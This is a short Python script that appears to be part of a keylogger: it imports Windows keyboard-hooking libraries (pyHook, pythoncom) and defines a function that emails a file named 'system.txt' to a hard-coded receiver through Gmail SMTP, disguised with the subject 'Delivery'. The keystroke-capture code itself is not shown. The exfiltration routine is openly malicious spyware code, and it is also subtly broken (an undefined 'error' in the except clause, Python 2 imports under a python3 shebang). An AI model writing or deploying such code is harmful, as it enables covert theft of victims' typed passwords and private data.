#!/usr/bin/python3

# When using gmail make sure you turn on  "allow less secure appps"
# you can do that here: https://myaccount.google.com/lesssecureapps

import smtplib, pyHook, pythoncom, sys, logging, os, time
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEBase import MIMEBase


def Send_Email():
    Sender = "sender@gmail.com"
    Rec = "receiver@hotmail.com"
    Password = "password of the sender!"

    subject = "Delivery"
    message = "Good morning :)"

    # this sends "system.txt" as an attachment
    fb = open("system.txt", "rb")
    attachment = MIMEText(fb.read())
    fb.close()

    msg = MIMEMultipart()
    msg["From"] = Sender
    msg["To"] = Rec
    msg["Subject"] = subject

    # Attach the file to email
    part = MIMEBase('application', "octet-stream")
    part.set_payload(open("system.txt", "rb").read())

    part.add_header('Content-Disposition', 'attachment; filename="system.txt"')
    msg.attach(part)

    # send the email, gmail configurations
    try:
        s = smtplib.SMTP("smtp.gmail.com", 587)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(Sender, Password)
        s.sendmail(Sender, Rec, msg.as_string())
        s.close()

    except error as e:
        print(str(e))
